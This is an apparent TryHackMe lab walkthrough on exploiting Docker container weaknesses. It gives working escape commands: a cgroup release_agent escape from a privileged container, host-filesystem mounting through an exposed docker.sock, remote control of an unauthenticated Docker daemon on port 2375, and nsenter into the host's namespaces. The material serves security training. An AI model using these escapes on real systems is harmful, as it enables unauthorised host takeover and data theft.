```
   (                )                                    (                        )   (       )           
   )\            ( /(   ) (          (  (     (   (   (  )\        (  (      ) ( /((  )\(  ( /((    (     
 (((_)  (   (    )\()| /( )\  (     ))\ )(    )\  )\ ))\((_)(     ))\ )(  ( /( )\())\((_)\ )\())\  ))\(   
 )\___  )\  )\ )(_))/)(_)|(_) )\ ) /((_|()\  ((_)((_)((_)_  )\ ) /((_|()\ )(_)|(_)((_)_((_|_))((_)/((_)\  
((/ __|((_)_(_/(| |_((_)_ (_)_(_/((_))  ((_) \ \ / (_))(| |_(_/((_))  ((_|(_)_| |(_|_) |(_) |_ (_|_))((_) 
 | (__/ _ \ ' \))  _/ _` || | ' \)) -_)| '_|  \ V /| || | | ' \)) -_)| '_/ _` | '_ \ | || |  _|| / -_|_-< 
  \___\___/_||_| \__\__,_||_|_||_|\___||_|     \_/  \_,_|_|_||_|\___||_| \__,_|_.__/_|_||_|\__||_\___/__/ 
```
In this THM room, we learn how some of the common vulnerabilities found within Docker
containers can be exploited. [^1]

Vulnerability 1: Privileged Containers (Capabilities)
-----------------------------------------------------------------------------------------
**Perform the exploit in this task on the target machine. What is the value of the flag
that has now been added to the container?**

Besides *user* or *normal* containers, there exist *privileged* containers which can
directly interact with the operating system. After connecting to the docker
container via SSH and the root credential, we can run `capsh --print`.

```text
# 1. Create a group which can use the kernel for exploiting the exploit.
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
    && mkdir /tmp/cgrp/x

# 2. When the "notify_on_release" flag is enabled (1) in a cgroup, then the code
#    that was specified by the "release_agent" from step 4 gets executed next.
#    https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt
$ echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Find out where the container's files are stored on the host in a variable.
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# 4. Copy the location of the container's files into the exploit and then into
#    the "release_agent" which gets executed by "cgroup" once it is released.
$ echo "$host_path/exploit" > /tmp/cgrp/release_agent

# 5. Turn the exploit into a shell on the host. Or place whatever we like in
#    the exploit file, e.g. a reverse shell to the attacking machine.
$ echo '#!/bin/sh' > /exploit

# 6. Execute a command to echo the host flag into a file named "flag.txt" in
#    the container once "/exploit" is executed.
$ echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

# 7. Make the exploit executable.
$ chmod a+x /exploit

# 8. Create a process and store that into the temporary file for execution.
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Vulnerability 2: Escaping via Exposed Docker Daemon
-----------------------------------------------------------------------------------------
**Name the directory path which contains the docker.sock file on the container. What is
the value of the flag located at `/root/flag.txt` on the host operating system after
performing the exploit?**

The `docker.sock` file on the container is mounted under `/var/run` and can be used to
interact with the host operating system using the Docker Engine. In order to exploit the
Docker socket, we will create a new container, mount the host's filesystem into this new
container and look at the host's filesystem:
```
# Upload a docker image, e.g. "alpine" then start the new container to mount
# the host's file system in the new container and run interactively. Change the
# root directory of the container to be /mnt and run `sh` to gain a shell.

$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
After executing this command, we can see that we have been placed into a new container
and mounted the host's filesystem to `/mnt` (and then used `chroot` to make the 
container's `/mnt` become `/`).


Vulnerability 3: Remote Code Execution via Exposed Docker Daemon
-----------------------------------------------------------------------------------------
**What port number, by default, does the Docker Engine use?**

By default, the engine runs on port *2375*, as it can be verified with `nmap`.
```
$ nmap -sV -p 2375 <TARGET_IP_ADDRESS>
2375/tcp open  docker  Docker 20.10.20
```
Next up, we can confirm that we can access the Docker daemon and execute our own Docker
commands, e.g. test if we can run commands or list containers here:
```
$ curl http://<TARGET_IP_ADDRESS>:2375/version
$ docker -H tcp://<TARGET_IP_ADDRESS>:2375 ps
```
Now, we can execute Docker commands, e.g. `network ls` to list networks of the containers,
`images` to exfiltrate data by reverse engineering, `exec` or `run`.

Vulnerability 4: Abusing Namespaces
-----------------------------------------------------------------------------------------
**Perform the exploit in this task on the target machine. What is the flag located in
`/home/tryhackme/flag.txt`?**

First, we can list the processes that are running on the Docker container with `ps aux`.
This attack abuses conditions where the container will share the same namespace as the
host operating system (and therefore, the container can communicate with the processes on
the host) and use cgroups (control groups).
```
# 1. Use the --target 1 switch to execute the shell command for root access.
# 2. Specify --mount where we provide the namespace of the target process.
# 3. Set the --uts switch to allow to share the same UTS namespace / hostname.
# 4. Get IPC (Inter Process Communication) shared memory with the --ipc switch.
# 5. Enter the network namespace for network-related features of the system.
# 6. Execute the /sbin/init (symbolic link to /lib/systemd/systemd) process.
# 7. Use the privileged namespace sh shell in the same namespace as the kernel.

$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

[^1]: https://tryhackme.com/room/containervulnerabilitiesDG
